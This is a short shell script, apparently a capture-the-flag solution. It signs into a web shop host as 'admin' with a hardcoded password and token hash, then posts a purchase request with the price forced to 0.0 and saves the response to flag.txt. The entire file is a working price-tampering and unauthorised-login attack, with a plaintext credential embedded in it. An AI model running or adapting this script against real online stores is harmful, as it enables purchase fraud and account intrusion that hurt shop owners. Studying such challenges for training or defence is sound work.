VERSION=1.1
PASSWORD=theophile0910
TOKEN_HASH=b69e8eff9a76f51ddad849f051127efe625e826c2e4e2bc4f45fe638ccf42616
RAND_CODE=$(curl --cookie-jar cookie.txt -I https://web-dev.dynamic-dns.net/?request=get_authentication_code | grep HTTP/1.1 | awk -F ' ' '{print $2}')
curl --cookie cookie.txt -A "Mozilla/5.0 ? id:BuyExpress/${VERSION}/A1548S968D2563" -X POST -F 'login=admin' -F "password=${PASSWORD}" -F "id=${TOKEN_HASH}${RAND_CODE}" https://web-dev.dynamic-dns.net/?request=sign_in
curl --cookie cookie.txt -X POST -F 'id=4' -F 'quantity=1' -F 'price=0.0' https://web-dev.dynamic-dns.net/?request=buy_product | tail -n +2 > flag.txt
rm -f cookie.txt
